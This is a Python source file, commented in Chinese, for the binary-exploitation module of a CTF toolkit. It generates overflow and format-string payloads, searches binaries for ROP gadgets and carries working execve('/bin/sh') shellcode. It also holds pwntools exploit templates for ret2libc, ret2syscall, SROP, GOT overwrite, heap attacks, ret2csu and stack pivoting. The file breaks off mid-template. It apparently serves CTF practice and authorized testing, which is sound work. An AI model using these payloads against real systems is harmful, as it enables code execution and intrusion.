# -*- coding: utf-8 -*-
"""Pwn 模块

覆盖：缓冲区溢出辅助、格式化字符串、ROP、Shellcode 模板、地址工具等。
用于授权安全测试和 CTF 竞赛环境。
"""

import os
import string
import struct

from ctftool.core.i18n import t
from ctftool.core.utils import read_file_bytes


class PwnModule:
    """Pwn/二进制利用工具集"""

    # ========== 缓冲区溢出 ==========

    def generate_pattern(self, length: int) -> str:
        """生成 De Bruijn 序列（用于精确定位溢出偏移）"""
        if length > 20000:
            return t("pwn.pattern.too_long")
        pattern = self._de_bruijn(length)
        return f"Pattern ({length} bytes):\n{pattern}"

    def find_pattern_offset(self, value: str) -> str:
        """在 De Bruijn 序列中查找偏移量"""
        # 支持 hex 输入
        if value.startswith('0x'):
            value_int = int(value, 16)
            # 尝试小端序
            try:
                if value_int > 0xFFFFFFFF:
                    value_bytes_le = struct.pack('<Q', value_int)
                else:
                    value_bytes_le = struct.pack('<I', value_int)
            except struct.error:
                value_bytes_le = struct.pack('<Q', value_int)
            value_str_le = value_bytes_le.decode('ascii', errors='ignore')
            # 尝试大端序
            try:
                if value_int > 0xFFFFFFFF:
                    value_bytes_be = struct.pack('>Q', value_int)
                else:
                    value_bytes_be = struct.pack('>I', value_int)
            except struct.error:
                value_bytes_be = struct.pack('>Q', value_int)
            value_str_be = value_bytes_be.decode('ascii', errors='ignore')
        else:
            value_str_le = value
            value_str_be = value

        pattern = self._de_bruijn(20000)
        results = []

        offset_le = pattern.find(value_str_le)
        if offset_le >= 0:
            results.append(f"{t('pwn.pattern.le_offset')}: {offset_le}")

        offset_be = pattern.find(value_str_be)
        if offset_be >= 0:
            results.append(f"{t('pwn.pattern.be_offset')}: {offset_be}")

        if not results:
            return t("pwn.pattern.not_found")
        return f"{t('pwn.pattern.result')}:\n" + "\n".join(results)

    def generate_padding(self, offset: int, ret_addr: str,
                         arch: str = "x86") -> str:
        """生成缓冲区溢出 payload"""
        if arch == "x86":
            addr_bytes = struct.pack('<I', int(ret_addr, 16))
            payload = b'A' * offset + addr_bytes
        elif arch == "x64":
            addr_bytes = struct.pack('<Q', int(ret_addr, 16))
            payload = b'A' * offset + addr_bytes
        else:
            return t("pwn.unsupported_arch")

        hex_payload = payload.hex()
        python_repr = f"b'{'A' * offset}' + struct.pack('<{'I' if arch == 'x86' else 'Q'}', {ret_addr})"

        return (
            f"=== {t('pwn.overflow.title')} ===\n"
            f"{t('pwn.overflow.offset')}: {offset}\n"
            f"{t('pwn.overflow.ret_addr')}: {ret_addr}\n"
            f"{t('pwn.overflow.arch')}: {arch}\n\n"
            f"Hex:\n  {hex_payload}\n\n"
            f"Python:\n  {python_repr}\n\n"
            f"{t('pwn.overflow.total_len')}: {len(payload)} bytes"
        )

    # ========== 格式化字符串 ==========

    def format_string_read(self, offset: int, addr: str,
                           arch: str = "x86") -> str:
        """生成格式化字符串读取 payload"""
        addr_int = int(addr, 16)
        if arch == "x86":
            addr_bytes = struct.pack('<I', addr_int)
            payload = addr_bytes + f'%{offset}$s'.encode()
        else:
            payload = f'%{offset}$s'.encode()

        return (
            f"=== {t('pwn.fmt.read_title')} ===\n"
            f"{t('pwn.fmt.target_addr')}: {addr}\n"
            f"{t('pwn.fmt.param_offset')}: {offset}\n"
            f"Payload hex: {payload.hex()}\n"
            f"Payload: {repr(payload)}"
        )

    def format_string_write(self, offset: int, addr: str,
                            value: int, arch: str = "x86") -> str:
        """生成格式化字符串写入 payload（逐字节写入）"""
        addr_int = int(addr, 16)
        lines = [
            f"=== {t('pwn.fmt.write_title')} ===",
            f"{t('pwn.fmt.target_addr')}: {addr}",
            f"{t('pwn.fmt.write_value')}: {value} (0x{value:X})",
            f"{t('pwn.fmt.param_offset')}: {offset}",
            "",
        ]

        if arch == "x86":
            # 拆分为 2 个 short write
            low = value & 0xFFFF
            high = (value >> 16) & 0xFFFF
            writes = sorted([(low, addr_int), (high, addr_int + 2)], key=lambda x: x[0])

            lines.append(f"{t('pwn.fmt.step_write')} (hhn/hn):")
            prev = 0
            for i, (val, a) in enumerate(writes):
                pad = val - prev
                if pad < 0:
                    pad += 0x10000
                lines.append(
                    f"  {t('pwn.fmt.addr')} 0x{a:X} {t('pwn.fmt.write')} 0x{val:04X}: "
                    f"%{pad}c%{offset + i}$hn"
                )
                prev = val

        elif arch == "x64":
            # x64: 地址含 NULL 字节，需放在 payload 末尾
            # 使用 %hhn 逐字节写入（每次写 1 字节）
            lines.append(f"=== {t('pwn.fmt.x64_mode')} ===")
            lines.append(t("pwn.fmt.x64_note"))
            lines.append("")

            # 拆分为逐字节
            bytes_to_write = []
            for i in range(8):
                byte_val = (value >> (i * 8)) & 0xFF
                if byte_val != 0 or i < 6:  # 跳过高位的零字节
                    bytes_to_write.append((byte_val, addr_int + i))

            writes = sorted(bytes_to_write, key=lambda x: x[0])

            lines.append(f"{t('pwn.fmt.step_write')} (%hhn):")
            prev = 0
            for i, (val, a) in enumerate(writes):
                pad = val - prev
                if pad <= 0:
                    pad += 0x100
                lines.append(
                    f"  {t('pwn.fmt.addr')} 0x{a:X} {t('pwn.fmt.write')} 0x{val:02X}: "
                    f"%{pad}c%{offset + i}$hhn"
                )
                prev = val % 0x100

            lines.append("")
            lines.append(f"pwntools {t('pwn.fmt.automation')}:")
            lines.append(f"  payload = fmtstr_payload({offset}, {{{addr}: {value}}}, write_size='byte')")

        lines.append(f"\n{t('pwn.fmt.tip')}")
        return "\n".join(lines)

    def find_format_offset(self) -> str:
        """生成用于查找格式化字符串偏移的测试 payload"""
        lines = [
            f"=== {t('pwn.fmt.find_offset_title')} ===",
            "",
            f"{t('pwn.fmt.find_offset_send')}:",
            "",
            "  AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p",
            "",
            f"{t('pwn.fmt.find_offset_or')}:",
            "",
            "  AAAA%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p",
            "",
            t("pwn.fmt.find_offset_look"),
            t("pwn.fmt.find_offset_example"),
        ]
        return "\n".join(lines)

    # ========== ROP ==========

    def _elf_load_segments(self, data: bytes) -> list:
        """解析 ELF PT_LOAD 段，返回 [(p_offset, p_vaddr, p_filesz)] 列表"""
        if data[:4] != b'\x7fELF':
            return []
        is_64 = data[4] == 2
        is_le = data[5] == 1
        fmt = '<' if is_le else '>'
        if is_64:
            e_phoff = struct.unpack(fmt + 'Q', data[32:40])[0]
            e_phentsize = struct.unpack(fmt + 'H', data[54:56])[0]
            e_phnum = struct.unpack(fmt + 'H', data[56:58])[0]
        else:
            e_phoff = struct.unpack(fmt + 'I', data[28:32])[0]
            e_phentsize = struct.unpack(fmt + 'H', data[42:44])[0]
            e_phnum = struct.unpack(fmt + 'H', data[44:46])[0]

        segments = []
        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            p_type = struct.unpack(fmt + 'I', data[off:off+4])[0]
            if p_type != 1:  # PT_LOAD
                continue
            if is_64:
                p_offset = struct.unpack(fmt + 'Q', data[off+8:off+16])[0]
                p_vaddr = struct.unpack(fmt + 'Q', data[off+16:off+24])[0]
                p_filesz = struct.unpack(fmt + 'Q', data[off+32:off+40])[0]
            else:
                p_offset = struct.unpack(fmt + 'I', data[off+4:off+8])[0]
                p_vaddr = struct.unpack(fmt + 'I', data[off+8:off+12])[0]
                p_filesz = struct.unpack(fmt + 'I', data[off+16:off+20])[0]
            segments.append((p_offset, p_vaddr, p_filesz))
        return segments

    def _file_offset_to_vaddr(self, segments: list, pos: int):
        """将文件偏移转换为虚拟地址，无法转换时返回 None"""
        for p_offset, p_vaddr, p_filesz in segments:
            if p_offset <= pos < p_offset + p_filesz:
                return pos - p_offset + p_vaddr
        return None

    def find_rop_gadgets(self, filepath: str, max_gadgets: int = 50) -> str:
        """在二进制文件中搜索 ROP gadgets"""
        from ctftool.core.utils import read_file_bytes
        data = read_file_bytes(filepath)
        lines = [f"=== ROP Gadget {t('pwn.rop.search')}: {filepath} ==="]

        # 解析 ELF PT_LOAD 段以计算虚拟地址
        segments = self._elf_load_segments(data)
        is_elf = len(segments) > 0

        # 搜索常见 gadget 模式
        gadgets = {
            b'\xc3': 'ret',
            b'\x5b\xc3': 'pop ebx; ret',
            b'\x5d\xc3': 'pop ebp; ret',
            b'\x5e\xc3': 'pop esi; ret / pop rsi; ret (x64)',
            b'\x5f\xc3': 'pop edi; ret / pop rdi; ret (x64)',
            b'\x58\xc3': 'pop eax; ret / pop rax; ret (x64)',
            b'\x59\xc3': 'pop ecx; ret',
            b'\x5a\xc3': 'pop edx; ret / pop rdx; ret (x64)',
            b'\x5b\x5d\xc3': 'pop ebx; pop ebp; ret',
            b'\x5e\x5f\xc3': 'pop esi; pop edi; ret',
            b'\x31\xc0\xc3': 'xor eax, eax; ret',
            b'\x31\xdb\xc3': 'xor ebx, ebx; ret',
            b'\x89\xe5\xc3': 'mov ebp, esp; ret',
            b'\xc9\xc3': 'leave; ret',
            b'\xcd\x80\xc3': 'int 0x80; ret',
            b'\x0f\x05\xc3': 'syscall; ret',
            # 64-bit gadgets
            b'\x41\x5f\xc3': 'pop r15; ret',
            b'\x41\x5e\xc3': 'pop r14; ret',
            b'\x5f\x5e\xc3': 'pop rdi; pop rsi; ret',
            b'\x5e\x5a\xc3': 'pop rsi; pop rdx; ret',
            b'\x5f\x5e\x5a\xc3': 'pop rdi; pop rsi; pop rdx; ret',
            b'\x48\x89\xe7\xc3': 'mov rdi, rsp; ret',
            b'\x48\x31\xc0\xc3': 'xor rax, rax; ret',
            b'\x48\x31\xff\xc3': 'xor rdi, rdi; ret',
            b'\x0f\x05': 'syscall',
        }

        found = []
        for pattern, desc in gadgets.items():
            offset = 0
            while True:
                pos = data.find(pattern, offset)
                if pos < 0:
                    break
                found.append((pos, desc, pattern))
                offset = pos + 1
                if len(found) >= max_gadgets * 3:
                    break

        found.sort(key=lambda x: x[0])
        found = found[:max_gadgets]

        if found:
            lines.append(f"\n{t('pwn.rop.found')} {len(found)} gadgets:")
            for pos, desc, pattern in found:
                hex_bytes = pattern.hex()
                if is_elf:
                    addr = self._file_offset_to_vaddr(segments, pos)
                    if addr is not None:
                        lines.append(f"  0x{addr:08X}: {hex_bytes:<16s} {desc}")
                    else:
                        lines.append(f"  0x{pos:08X}: {hex_bytes:<16s} {desc} (file offset)")
                else:
                    lines.append(f"  0x{pos:08X}: {hex_bytes:<16s} {desc} (file offset)")
        else:
            lines.append(t("pwn.rop.not_found"))

        return "\n".join(lines)

    # ========== Shellcode ==========

    def shellcode_template(self, os_type: str = "linux",
                           arch: str = "x86") -> str:
        """获取 shellcode 模板"""
        templates = {
            ("linux", "x86"): {
                "name": "Linux x86 execve(/bin/sh)",
                "shellcode": (
                    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
                    "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
                    "\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
                ),
                "length": 23,
                "description": "execve(\"/bin/sh\", [\"/bin/sh\"], NULL)",
            },
            ("linux", "x64"): {
                "name": "Linux x64 execve(/bin/sh)",
                "shellcode": (
                    "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62"
                    "\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54"
                    "\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
                ),
                "length": 23,
                "description": "execve(\"/bin/sh\", 0, 0) via syscall",
            },
            ("windows", "x86"): {
                "name": "Windows x86 WinExec(cmd)",
                "shellcode": t("pwn.shellcode.need_generate"),
                "length": 0,
                "description": t("pwn.shellcode.use_msfvenom"),
            },
        }

        key = (os_type.lower(), arch.lower())
        if key not in templates:
            return f"{t('pwn.shellcode.supported')}: {list(templates.keys())}"

        tpl = templates[key]
        return (
            f"=== {tpl['name']} ===\n"
            f"{t('pwn.shellcode.desc')}: {tpl['description']}\n"
            f"{t('pwn.shellcode.length')}: {tpl['length']} bytes\n\n"
            f"Shellcode:\n  {tpl['shellcode']}\n\n"
            f"Python:\n  shellcode = b\"{tpl['shellcode']}\""
        )

    # ========== 地址工具 ==========

    def addr_convert(self, addr: str) -> str:
        """地址格式转换"""
        addr_int = int(addr, 16) if addr.lower().startswith('0x') else int(addr)
        lines = [f"=== {t('pwn.addr.title')}: 0x{addr_int:X} ==="]

        # 32位
        if addr_int <= 0xFFFFFFFF:
            le_32 = struct.pack('<I', addr_int)
            be_32 = struct.pack('>I', addr_int)
            lines.append(f"{t('pwn.addr.32_le')}: {le_32.hex()} ({repr(le_32)})")
            lines.append(f"{t('pwn.addr.32_be')}: {be_32.hex()} ({repr(be_32)})")
            lines.append(f"Python struct: struct.pack('<I', 0x{addr_int:X})")

        # 64位
        if addr_int <= 0xFFFFFFFFFFFFFFFF:
            le_64 = struct.pack('<Q', addr_int)
            be_64 = struct.pack('>Q', addr_int)
            lines.append(f"{t('pwn.addr.64_le')}: {le_64.hex()} ({repr(le_64)})")
            lines.append(f"{t('pwn.addr.64_be')}: {be_64.hex()} ({repr(be_64)})")
            lines.append(f"Python struct: struct.pack('<Q', 0x{addr_int:X})")

        lines.append(f"{t('pwn.addr.decimal')}: {addr_int}")
        lines.append(f"{t('pwn.addr.binary')}: {bin(addr_int)}")
        return "\n".join(lines)

    # ========== pwntools 脚本模板 ==========

    def pwntools_template(self, target: str = "target", arch: str = "x86") -> str:
        """生成 pwntools 利用脚本模板"""
        ctx = "i386" if arch == "x86" else "amd64"
        return f'''=== pwntools {t("pwn.template.exploit_script")} ===

#!/usr/bin/env python3
from pwn import *

# 上下文设置
context.arch = '{ctx}'
context.log_level = 'debug'

# 连接目标
# p = remote('ip', port)
p = process('./{target}')
elf = ELF('./{target}')
# libc = ELF('./libc.so.6')

# ===== 利用代码 =====

# 接收输出
p.recvuntil(b'> ')

# 构造 payload
offset = 0x00  # TODO: 填入溢出偏移量
payload = b'A' * offset
# payload += p{'32' if arch == 'x86' else '64'}(elf.symbols['win'])  # 覆盖返回地址

# 发送 payload
p.sendline(payload)

# 交互
p.interactive()
'''

    def ret2libc_template(self, arch: str = "x86") -> str:
        """生成 ret2libc 利用模板"""
        title = f"=== ret2libc ({arch}) {t('pwn.template.exploit')} ==="
        if arch == "x86":
            return title + '''

#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')  # 或 /lib/i386-linux-gnu/libc.so.6

# 1. 泄露 libc 地址
# 利用 puts 打印 GOT 表中某函数的真实地址
payload = b'A' * OFFSET
payload += p32(elf.plt['puts'])        # 调用 puts
payload += p32(elf.symbols['main'])    # 返回 main 再次利用
payload += p32(elf.got['puts'])        # puts 参数: GOT 中 puts 的地址
p.sendline(payload)

# 接收泄露的地址
leaked = u32(p.recv(4))
log.info(f'Leaked puts: {hex(leaked)}')

# 2. 计算 libc 基址
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# 3. getshell
payload2 = b'A' * OFFSET
payload2 += p32(system)
payload2 += p32(0)       # 假返回地址
payload2 += p32(bin_sh)  # /bin/sh 参数
p.sendline(payload2)

p.interactive()
'''
        else:
            return title + '''

#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# x64 使用寄存器传参: rdi, rsi, rdx, rcx
pop_rdi = 0x0  # TODO: ROPgadget --binary vuln | grep 'pop rdi'

# 1. 泄露 libc
payload = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendline(payload)

leaked = u64(p.recvuntil(b'\\n')[:-1].ljust(8, b'\\x00'))
log.info(f'Leaked puts: {hex(leaked)}')

# 2. 计算 libc
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# 3. getshell
payload2 = b'A' * OFFSET
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)
p.sendline(payload2)

p.interactive()
'''

    def ret2syscall_template(self, arch: str = "x86") -> str:
        """生成 ret2syscall 利用模板"""
        if arch == "x86":
            return f'''=== ret2syscall (x86) {t("pwn.template.exploit")} ===

#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
p = process('./vuln')
elf = ELF('./vuln')

# 需要找到的 gadgets:
# ROPgadget --binary vuln | grep "pop eax"
# ROPgadget --binary vuln | grep "pop ebx"
# ROPgadget --binary vuln | grep "pop ecx"
# ROPgadget --binary vuln | grep "pop edx"
# ROPgadget --binary vuln | grep "int 0x80"

pop_eax = 0x0  # TODO
pop_ebx = 0x0  # TODO
pop_ecx = 0x0  # TODO
pop_edx = 0x0  # TODO
int_80  = 0x0  # TODO
bin_sh  = 0x0  # TODO: address of "/bin/sh" string

# execve("/bin/sh", 0, 0)
# eax = 0xb (sys_execve)
# ebx = addr of "/bin/sh"
# ecx = 0
# edx = 0
payload = b'A' * OFFSET
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_ebx) + p32(bin_sh)
payload += p32(pop_ecx) + p32(0)
payload += p32(pop_edx) + p32(0)
payload += p32(int_80)

p.sendline(payload)
p.interactive()
'''
        else:
            return f'''=== ret2syscall (x64) {t("pwn.template.exploit")} ===

#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
p = process('./vuln')
elf = ELF('./vuln')

# 需要找到的 gadgets:
# ROPgadget --binary vuln | grep "pop rax"
# ROPgadget --binary vuln | grep "pop rdi"
# ROPgadget --binary vuln | grep "pop rsi"
# ROPgadget --binary vuln | grep "pop rdx"
# ROPgadget --binary vuln | grep "syscall"

pop_rax = 0x0  # TODO
pop_rdi = 0x0  # TODO
pop_rsi = 0x0  # TODO
pop_rdx = 0x0  # TODO
syscall = 0x0  # TODO
bin_sh  = 0x0  # TODO

# execve("/bin/sh", 0, 0)
# rax = 59 (sys_execve)
# rdi = addr of "/bin/sh"
# rsi = 0
# rdx = 0
payload = b'A' * OFFSET
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)

p.sendline(payload)
p.interactive()
'''

    def srop_template(self, arch: str = "x64") -> str:
        """生成 SROP (Sigreturn-Oriented Programming) 利用模板"""
        return f'''=== SROP {t("pwn.template.exploit")} ({arch}) ===

#!/usr/bin/env python3
from pwn import *

context.arch = '{"amd64" if arch == "x64" else "i386"}'
p = process('./vuln')

# SROP 利用 sigreturn 系统调用伪造完整的寄存器上下文
# 关键: 需要找到一个 syscall; ret gadget

syscall_ret = 0x0  # TODO: ROPgadget --binary vuln | grep "syscall"

# 构造 SigreturnFrame
frame = SigreturnFrame()
frame.rax = 59          # sys_execve
frame.rdi = 0x0         # TODO: /bin/sh 地址
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

# 触发 sigreturn (rax=15)
payload = b'A' * OFFSET
payload += p64(syscall_ret)  # syscall with rax=15 (sigreturn)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
'''

    # ========== Shellcode 坏字符检测 ==========

    def check_bad_chars(self, shellcode_hex: str, custom_bad: str = "") -> str:
        """检测 Shellcode 中的坏字符"""
        try:
            import binascii
            shellcode_hex = shellcode_hex.strip().replace(' ', '').replace('\\x', '').replace('0x', '')
            data = binascii.unhexlify(shellcode_hex)
        except Exception:
            data = shellcode_hex.encode()

        bad_chars = [
            (0x00, t("pwn.bad.null")),
            (0x0a, t("pwn.bad.lf")),
            (0x0d, t("pwn.bad.cr")),
            (0x20, t("pwn.bad.space")),
            (0x09, "TAB (\\x09)"),
            (0xff, t("pwn.bad.xff")),
        ]

        # 合并用户自定义坏字符
        if custom_bad:
            for bc in custom_bad.split(','):
                bc = bc.strip().replace('0x', '').replace('\\x', '')
                try:
                    byte_val = int(bc, 16)
                    if byte_val not in [b for b, _ in bad_chars]:
                        bad_chars.append((byte_val, f"{t('pwn.bad.custom')} (0x{byte_val:02x})"))
                except ValueError:
                    pass

        common_bad = {b: desc for b, desc in bad_chars}

        lines = [f"=== Shellcode {t('pwn.bad.title')} ==="]
        lines.append(f"{t('pwn.shellcode.length')}: {len(data)} bytes")

        found_bad = []
        for i, byte in enumerate(data):
            if byte in common_bad:
                found_bad.append((i, byte, common_bad[byte]))

        if found_bad:
            lines.append(f"\n{t('pwn.bad.found')} {len(found_bad)} {t('pwn.bad.potential')}:")
            for offset, byte, desc in found_bad:
                lines.append(f"  {t('pwn.bad.offset')} 0x{offset:04X}: 0x{byte:02X} - {desc}")
            lines.append(f"\n{t('pwn.bad.suggest')}")
            bad_bytes = ''.join('\\x{:02x}'.format(b) for _, b, _ in found_bad)
            lines.append(f"  msfvenom -b '{bad_bytes}'")
        else:
            lines.append(f"\n{t('pwn.bad.none_found')}")

        return "\n".join(lines)

    # ========== GOT 覆写 ==========

    def got_overwrite_template(self, arch: str = "x86") -> str:
        """生成 GOT 覆写利用模板"""
        ctx = "i386" if arch == "x86" else "amd64"
        p_func = "p32" if arch == "x86" else "p64"
        return f'''=== GOT {t("pwn.template.overwrite")} ({arch}) ===

#!/usr/bin/env python3
from pwn import *

context.arch = '{ctx}'
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# 1. 泄露 GOT 表中某函数的真实地址
# 常用: puts@GOT, printf@GOT, __libc_start_main@GOT
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
log.info(f"puts@GOT: {{hex(got_puts)}}")
log.info(f"puts@PLT: {{hex(plt_puts)}}")

# 2. 利用漏洞泄露地址（以格式化字符串为例）
# payload = {p_func}(got_puts) + b'%7$s'
# p.sendline(payload)
# leaked = u{"32" if arch == "x86" else "64"}(p.recv({"4" if arch == "x86" else "6"}).ljust({"4" if arch == "x86" else "8"}, b'\\x00'))

# 3. 计算 libc 基址
# libc_base = leaked - libc.symbols['puts']
# system = libc_base + libc.symbols['system']

# 4. 覆写 GOT 表 (将某个函数的 GOT 条目改为 system)
# 常用: 将 strlen@GOT / printf@GOT 覆写为 system
# 下次调用 strlen("/bin/sh") 就变成 system("/bin/sh")

# 使用格式化字符串覆写:
# fmtstr_payload(offset, {{elf.got["strlen"]: system}})

p.interactive()
'''

    # ========== 内部方法 ==========

    def heap_exploit_template(self, technique: str = "tcache") -> str:
        """堆利用模板"""
        templates = {
            "tcache": '''=== Tcache Poisoning 模板 ===

适用: glibc 2.26+ (Ubuntu 18.04+), chunk size < 0x410

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# 1. 泄露 heap/libc 地址
# 利用 UAF 或 double free 泄露

# 2. Tcache poisoning
# 分配并释放两个相同大小的 chunk
alloc(0x20)   # chunk A
alloc(0x20)   # chunk B
free(A)       # tcache[0x30]: A
free(B)       # tcache[0x30]: B -> A

# 3. 修改 tcache fd 指针
# 通过 UAF 或 edit 功能修改 B 的 fd
edit(B, p64(target_addr))  # tcache[0x30]: B -> target_addr

# 4. 分配到目标地址
alloc(0x20)   # 取出 B
alloc(0x20)   # 取出 target_addr (任意地址写)

# 5. 覆写 __free_hook 或 __malloc_hook
write(target, p64(system_addr))
# 触发 system("/bin/sh")
```

注意:
- glibc 2.32+ 加入了 tcache key 检测，需要绕过
- glibc 2.34+ 移除了 __malloc_hook/__free_hook
''',
            "fastbin": '''=== Fastbin Attack 模板 ===

适用: glibc < 2.26 或 fastbin 范围内 (size <= 0x80 on x64)

```python
from pwn import *

# 1. 触发 double free (绕过 fastbin 检测)
alloc(0x60)   # A
alloc(0x60)   # B
free(A)
free(B)
free(A)       # fastbin: A -> B -> A

# 2. 修改 fd 指向 __malloc_hook - 0x23
fake_chunk = libc.sym['__malloc_hook'] - 0x23
alloc(0x60, p64(fake_chunk))  # A, fd 被改为 fake_chunk
alloc(0x60)   # B
alloc(0x60)   # A
alloc(0x60)   # fake_chunk (在 __malloc_hook 附近)

# 3. 覆写 __malloc_hook
edit(payload=b'\\x00' * 0x13 + p64(one_gadget))
```

注意:
- fastbin 会检查 size 字段, 需要找到合适的 fake size
- 0x7f 字节常出现在 libc 地址附近，因此用 0x60(+0x10=0x70) 的 chunk
''',
            "house_of_force": '''=== House of Force 模板 ===

适用: 可以溢出 top chunk 的 size 字段

```python
from pwn import *

# 1. 覆写 top chunk size 为 -1 (0xffffffffffffffff)
alloc(offset_to_top_size, b'A' * offset + p64(0xffffffffffffffff))

# 2. 计算到目标的距离
target = elf.got['free']  # 或其他目标地址
top_addr = heap_base + current_top_offset
distance = target - top_addr - 0x20  # 减去 chunk header

# 3. 大分配移动 top chunk
alloc(distance)

# 4. 下一次分配落在目标地址
alloc(0x20, p64(system_addr))  # 覆写 GOT 表
```
''',
        }

        technique = technique.lower().replace('-', '_').replace(' ', '_')
        if technique in templates:
            return templates[technique]

        available = ', '.join(templates.keys())
        lines = [
            f"=== {t('pwn.heap.tech_list')} ===",
            "",
            f"{t('pwn.heap.available')}: {available}",
            "",
            f"{t('pwn.heap.usage')}: heap_exploit_template('tcache')",
            "",
            f"{t('pwn.heap.other_techniques')}:",
            f"  - House of Spirit: {t('pwn.heap.spirit_desc')}",
            f"  - House of Lore: {t('pwn.heap.lore_desc')}",
            f"  - House of Orange: {t('pwn.heap.orange_desc')}",
            f"  - Unsorted bin attack: {t('pwn.heap.unsorted_desc')}",
            f"  - Large bin attack: {t('pwn.heap.large_desc')}",
        ]
        return '\n'.join(lines)

    def one_gadget_helper(self) -> str:
        """one_gadget 使用提示"""
        return f'''=== one_gadget {t("pwn.one_gadget.title")} ===

one_gadget 可以找到 libc 中满足特定约束即可 getshell 的地址。

安装:
  gem install one_gadget

使用:
  one_gadget /path/to/libc.so.6

示例输出:
  0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
  constraints:
    rsp & 0xf == 0
    rcx == NULL

  0x4f432 execve("/bin/sh", rsp+0x40, environ)
  constraints:
    [rsp+0x40] == NULL

在 pwntools 中使用:
```python
one_gadget = libc_base + 0x4f3d5  # 替换为实际偏移
# 覆写 __malloc_hook / __free_hook / 返回地址 为 one_gadget
```

注意:
- 不同 libc 版本的 one_gadget 偏移不同
- 需要满足约束条件才能成功
- glibc 2.34+ 移除了 hook，需要其他方式触发
'''

    def ret2csu_template(self, arch: str = "x64") -> str:
        """生成 ret2csu 利用模板"""
        if arch != "x64":
            return t("pwn.ret2csu.x64_only")

        return f'''=== ret2csu (x64) {t("pwn.template.exploit")} ===

# __libc_csu_init 中包含两段通用 gadget，可用于控制 rdx/rsi/edi 并调用任意函数指针。
# 适用场景: 二进制中缺少 pop rdx 等 gadget 时。

#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
p = process('./vuln')
elf = ELF('./vuln')

# ===== 查找 __libc_csu_init 中的 gadget =====
# 可通过 objdump -d vuln | grep -A 20 "__libc_csu_init" 查看

# gadget1: (位于 __libc_csu_init 末尾附近)
#   pop rbx
#   pop rbp
#   pop r12
#   pop r13
#   pop r14
#   pop r15
#   ret
csu_gadget1 = 0x0  # TODO: 填入实际地址

# gadget2: (位于 __libc_csu_init 中间)
#   mov rdx, r14   (or r15 depending on version)
#   mov rsi, r13
#   mov edi, r12d
#   call qword ptr [r15 + rbx*8]  (or [r12 + rbx*8])
csu_gadget2 = 0x0  # TODO: 填入实际地址

def ret2csu(func_ptr, arg1, arg2, arg3):
    """
    利用 __libc_csu_init gadget 调用函数
    func_ptr: 存放目标函数地址的指针（注意是指针，不是函数地址本身）
              例如 GOT 表项地址
    arg1: edi (32位截断)
    arg2: rsi
    arg3: rdx
    """
    payload = b''
    # gadget1: 设置寄存器
    payload += p64(csu_gadget1)
    payload += p64(0)          # rbx = 0
    payload += p64(1)          # rbp = 1 (使 rbx+1==rbp，跳过循环)
    payload += p64(arg1)       # r12 -> edi
    payload += p64(arg2)       # r13 -> rsi
    payload += p64(arg3)       # r14 -> rdx
    payload += p64(func_ptr)   # r15 -> call [r15+rbx*8]
    # gadget2: 执行调用
    payload += p64(csu_gadget2)
    # gadget2 执行完后会继续执行 gadget1 的 pop 序列
    # 需要填充 7 个 dummy 值 (6 个 pop + ret)
    payload += p64(0) * 7      # padding
    return payload

# ===== 利用示例 =====
offset = 0x0  # TODO: 溢出偏移量

# 示例: 调用 write(1, got_addr, 8) 泄露地址
# write@GOT 中存储了 write 的真实地址
payload = b'A' * offset
payload += ret2csu(
    func_ptr=elf.got['write'],  # call write
    arg1=1,                      # fd = stdout
    arg2=elf.got['puts'],        # buf = puts@GOT
    arg3=8                       # count = 8
)
payload += p64(elf.symbols['main'])  # 返回 main 继续利用

p.sendline(payload)
p.interactive()

# ===== 注意事项 =====
# 1. gadget2 中 edi 只有 32 位，高 32 位被清零
# 2. call 的目标是内存中的函数指针（间接调用），不是函数地址
# 3. 不同编译器版本寄存器分配可能略有不同，需要实际确认
# 4. rbp 必须设为 rbx+1，否则会进入循环
'''

    def stack_pivot_template(self, arch: str = "x64") -> str:
        """生成栈迁移利用模板"""
        ctx = "amd64" if arch == "x64" else "i386"
        p_func = "p64" if arch == "x64" else "p32"
        reg_sp = "rsp" if arch == "x64" else "esp"
        reg_bp = "rbp" if arch == "x64" else "ebp"
        reg_ax = "rax" if arch == "x64" else "eax"

        return f'''=== {t("pwn.stack_pivot.title")} (Stack Pivot) {t("pwn.template.exploit")} ({arch}) ===

# 栈迁移用于当溢出空间有限、无法放置完整 ROP chain 时，
# 将栈指针 ({reg_sp}) 迁移到一个我们控制的内存区域。

#!/usr/bin/env python3
from pwn import *

context.arch = '{ctx}'
p = process('./vuln')
elf = ELF('./vuln')

# ===== 方法 1: leave; ret 技巧 =====
# leave 等价于:
